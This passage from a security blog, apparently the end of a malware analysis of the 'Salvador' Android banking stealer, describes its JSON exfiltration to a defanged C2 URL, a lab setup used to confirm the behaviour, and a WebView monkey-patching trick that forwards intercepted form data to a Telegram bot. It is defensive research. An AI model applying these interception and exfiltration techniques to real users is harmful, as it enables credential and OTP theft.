+<h5 id="b-the-randall-function-web-exfiltration">B. The Randall Function (Web Exfiltration)</h5>
+<p>Serving as a backup, this function ensures data is stolen even if a forwarding number cannot be reached. It operates as the following:</p>
+<ol>
+<li><strong>JSON Payload:</strong> It structures the collected Map data into a JSON object.</li>
+<li><strong>C2 Upload:</strong> It sends an HTTP POST request to <strong>https://t15[.]muletipushpa[.]cloud/post[.]php</strong> with the json object as the body.</li>
+</ol>
+<h4 id="dynamic-analysis-validation">Dynamic Analysis Validation</h4>
+<p>To validate the malware behaviour I setup a virtual lab containing the following:</p>
+<ul>
+<li>Remnux</li>
+<li>Rooted Pixel 2 XL virtual emulator</li>
+<li>MiTMProxy</li>
+<li>INetSim</li>
+</ul>
+<p>First off, we got the lab set up and made sure everything was good to go. That meant double checking that every piece worked, setting up a fake network with INetSIM, making sure the MITMProxy cert was trusted, and finally, getting the malicious app (the APK) deployed.</p>
+<p>After running the malware, the WebView successfully loaded the phishing page from the C2 server (simulated by InetSim in the lab) as expected[4]:</p>
+<p><img loading="lazy" src="/images/image7.png"><br>
+[4] INetSIM fake phishing page</p>
+<p>Then I emulated SMS received by the user by using the android studio ‘Extended Controls[5]:</p>
+<p><img loading="lazy" src="/images/image6.png"><br>
+[5] Android Studio Extended Controls</p>
+<p>Monitoring the MiTMProxy window, the following POST request was sent:</p>
+<p><img loading="lazy" src="/images/image13.png">
+[6] HTTP POST Request sent by the Salvador stealer</p>
+<p>As seen in the provided logs, the malware initiated a JSON-formatted POST request to the malicious server immediately upon receiving a simulated SMS.</p>
+<h4 id="advanced-exfiltration-via-webview-monkey-patching">Advanced Exfiltration via WebView &ldquo;Monkey Patching&rdquo;</h4>
+<p>In addition to SMS theft, the malware targets data handled within the app&rsquo;s <code>WebView</code> (such as login credentials and PII  information) using a technique known as <strong>Monkey Patching</strong>.</p>
+<h4 id="understanding-monkey-patching-in-salvador-stealer">Understanding Monkey Patching in Salvador Stealer</h4>
+<p>Monkey patching is the modification of the behavior of built in JavaScript objects at runtime. The malware utilizes the technique by injecting a script that replaces the standard <strong>XMLHttpRequest.prototype.send</strong> function.</p>
+<p>Every time a legitimate web request is made within the app WebView, the &ldquo;patched&rdquo; version of <strong>.send()</strong> is called first. Then the script captures the <strong>data</strong> variable and uses the <strong>fetch()</strong> API to send the captured data to a Telegram bot (using the credentials decoded via <strong>decodeURIComponent</strong> in the previous step).</p>
+<p>Finally, it calls the <em>original</em> send function (<strong>originalSend.apply</strong>), so the web page continues to function normally, leaving the user unaware that their data was intercepted.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>Salvador is a banking infostealer built to harvest user credentials and intercept OTP tokens via Telegram bots and dedicated Command and Control infrastructure.</p>
+<p>Although the offline status of the threat actor&rsquo;s servers made dynamic analysis of the infection chain more difficult, static analysis still proved to be a compelling exercise. Ultimately, despite the malware&rsquo;s lack of complex native code, the author&rsquo;s use of obfuscation presented a nice reverse engineering challenge.</p>
+<hr>
+<h1 id="references">References</h1>
+<ol>
+<li><a href="https://unit42.paloaltonetworks.com/apk-badpack-malware-tampered-headers/">https://unit42.paloaltonetworks.com/apk-badpack-malware-tampered-headers/</a></li>
+<li><a href="https://github.com/YaxyZ/BadpackDetectAndFix">https://github.com/YaxyZ/BadpackDetectAndFix</a></li>
+<li><a href="https://bazaar.abuse.ch/sample/c7cece55ca69aa27aa73fb58722cc04c07d9ea33cba59d8394e2c3265f3987d8/">https://bazaar.abuse.ch/sample/c7cece55ca69aa27aa73fb58722cc04c07d9ea33cba59d8394e2c3265f3987d8/</a></li>
+<li><a href="https://cybernews.com/security/android-banking-trojans-peak-stealing-money-undetected/">https://cybernews.com/security/android-banking-trojans-peak-stealing-money-undetected/</a></li>
+<li><a href="https://www.geeksforgeeks.org/javascript/monkey-patching-in-javascript/">https://www.geeksforgeeks.org/javascript/monkey-patching-in-javascript/</a></li>
+</ol>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">YaxyZ&#39;s Blog</a></span>
+
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
